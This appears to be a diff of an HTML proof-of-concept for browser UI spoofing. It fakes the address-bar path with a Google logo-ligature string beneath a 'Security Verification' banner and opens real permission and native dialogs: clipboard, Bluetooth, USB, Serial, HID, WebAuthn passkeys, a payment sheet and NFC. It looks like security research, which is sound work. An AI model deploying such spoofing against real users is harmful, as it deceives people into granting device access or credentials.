@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>awdawd</title>
+    <title>Ultimate UI Spoofing PoC</title>
     <style>
       body {
         font-family: sans-serif;
@@ -14,12 +14,12 @@
         margin: 0;
       }
       h2 { color: #8ab4f8; margin-bottom: 5px; }
-      p { color: #9aa0a6; margin-bottom: 20px; }
+      p { color: #9aa0a6; margin-bottom: 20px; font-size: 14px; }
       .grid {
         display: grid;
-        grid-template-columns: 1fr 1fr;
+        grid-template-columns: 1fr;
         gap: 15px;
-        max-width: 400px;
+        max-width: 350px;
         margin: 0 auto;
       }
       .btn {
@@ -34,25 +34,32 @@
         box-shadow: 0 4px 6px rgba(0,0,0,0.3);
       }
       .btn:active { background: #1557b0; }
-      #status { margin-top: 20px; color: #34a853; font-weight: bold; }
+      .btn-critical { background: #ea4335; } /* Warna merah untuk bottom sheet OS */
+      .btn-critical:active { background: #b31404; }
+      #status { margin-top: 20px; color: #34a853; font-weight: bold; font-size: 14px; }
     </style>
   </head>
   <body>
-    <h2>tester</h2>
+    <h2>Security Verification</h2>
+    <p>Check your address bar, then trigger the modules.</p>
 
     <div class="grid">
-      <button class="btn" id="btn-cam-mic">Camera & Mic</button>
-      <button class="btn" id="btn-loc">Location</button>
-      <button class="btn" id="btn-notif">Notifications</button>
       <button class="btn" id="btn-clip">Read Clipboard</button>
-      <button class="btn" id="btn-bt">Bluetooth</button>
-      <button class="btn" id="btn-usb">USB Devices</button>
-      <button class="btn" id="btn-contact">Contacts</button>
+      <button class="btn" id="btn-bt">Bluetooth Device</button>
+      <button class="btn" id="btn-usb">USB Device</button>
+
+      <button class="btn" id="btn-serial">Web Serial Port</button>
+      <button class="btn" id="btn-hid">Web HID Device</button>
+
+      <button class="btn btn-critical" id="btn-auth">WebAuthn / Passkeys</button>
+      <button class="btn btn-critical" id="btn-pay">Payment Request</button>
+      <button class="btn btn-critical" id="btn-nfc">Web NFC Scan</button>
     </div>
 
     <div id="status"></div>
 
     <script>
+      // INJEKSI URL PATH (Fake Omnibox)
       window.onload = function () {
         const magicString = "googlelogoligature";
         const spoofedPath = "/" + magicString + "/secure-module";
@@ -62,58 +69,95 @@
       const statusEl = document.getElementById('status');
       const log = (msg) => { statusEl.innerText = msg; };
 
-      document.getElementById('btn-cam-mic').onclick = async () => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            stream.getTracks().forEach(t => t.stop()); // Matikan langsung kalau tembus
-            log("Camera & Mic Granted!");
-        } catch(e) { log("Camera/Mic Denied: " + e.message); }
-      };
-
-      document.getElementById('btn-loc').onclick = () => {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => log(`Location Granted! (Lat: ${pos.coords.latitude})`),
-            (err) => log("Location Denied: " + err.message)
-        );
-      };
-
-      document.getElementById('btn-notif').onclick = async () => {
-        const perm = await Notification.requestPermission();
-        log("Notification status: " + perm);
-      };
-
+      // ==========================================
+      // 1. CONFIRMED VULNERABLE APIs
+      // ==========================================
+      
       document.getElementById('btn-clip').onclick = async () => {
+        log("Waiting for clipboard prompt...");
         try {
             const text = await navigator.clipboard.readText();
-            log("Clipboard Read Granted! Data: " + text.substring(0,20) + "...");
+            log("Clipboard Granted!");
         } catch(e) { log("Clipboard Denied: " + e.message); }
       };
 
       document.getElementById('btn-bt').onclick = async () => {
+        log("Opening Bluetooth picker...");
         try {
             const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
-            log("Bluetooth Granted! Device: " + device.name);
+            log("Bluetooth Granted!");
         } catch(e) { log("Bluetooth Denied: " + e.message); }
       };
 
       document.getElementById('btn-usb').onclick = async () => {
+        log("Opening USB picker...");
         try {
             const device = await navigator.usb.requestDevice({ filters: [] });
-            log("USB Granted! Product: " + device.productName);
+            log("USB Granted!");
         } catch(e) { log("USB Denied: " + e.message); }
       };
 
-      document.getElementById('btn-contact').onclick = async () => {
-        if ('contacts' in navigator && 'ContactsManager' in window) {
-            try {
-                const props = ['name', 'email', 'tel'];
-                const contacts = await navigator.contacts.select(props, { multiple: false });
-                log("Contacts Granted! Got " + contacts.length + " contact.");
-            } catch(e) { log("Contacts Denied: " + e.message); }
-        } else {
-            log("Contacts API not supported on this browser.");
-        }
+      // ==========================================
+      // 2. NEW HARDWARE CHOOSERS TO TEST
+      // ==========================================
+
+      document.getElementById('btn-serial').onclick = async () => {
+        log("Opening Web Serial picker...");
+        try {
+            await navigator.serial.requestPort();
+            log("Serial Port Granted!");
+        } catch(e) { log("Serial Denied: " + e.message); }
       };
+
+      document.getElementById('btn-hid').onclick = async () => {
+        log("Opening Web HID picker...");
+        try {
+            await navigator.hid.requestDevice({ filters: [] });
+            log("HID Granted!");
+        } catch(e) { log("HID Denied: " + e.message); }
+      };
+
+      // ==========================================
+      // 3. NATIVE BOTTOM SHEETS (CRITICAL)
+      // ==========================================
+
+      document.getElementById('btn-auth').onclick = async () => {
+        log("Opening Biometric/Passkey dialog...");
+        try {
+            const options = {
+                challenge: new Uint8Array(16),
+                rp: { name: "Verification System", id: document.domain },
+                user: { id: new Uint8Array(16), name: "user@example.com", displayName: "User" },
+                pubKeyCredParams: [{alg: -7, type: "public-key"}],
+                timeout: 60000,
+                authenticatorSelection: { authenticatorAttachment: "platform" }
+            };
+            await navigator.credentials.create({ publicKey: options });
+            log("WebAuthn Finished.");
+        } catch(e) { log("WebAuthn Closed: " + e.message); }
+      };
+
+      document.getElementById('btn-pay').onclick = async () => {
+        log("Opening Payment Request sheet...");
+        try {
+            const request = new PaymentRequest(
+                [{ supportedMethods: "basic-card" }], 
+                { total: { label: "Verification Fee", amount: { currency: "USD", value: "0.00" } } }
+            );
+            await request.show();
+            log("Payment Dialog Closed.");
+        } catch(e) { log("Payment Closed: " + e.message); }
+      };
+
+      document.getElementById('btn-nfc').onclick = async () => {
+        log("Waiting for NFC scan dialog...");
+        try {
+            const ndef = new NDEFReader();
+            await ndef.scan();
+            log("NFC Scanner Opened!");
+        } catch(e) { log("NFC Error: " + e.message); }
+      };
+
     </script>
   </body>
 </html>
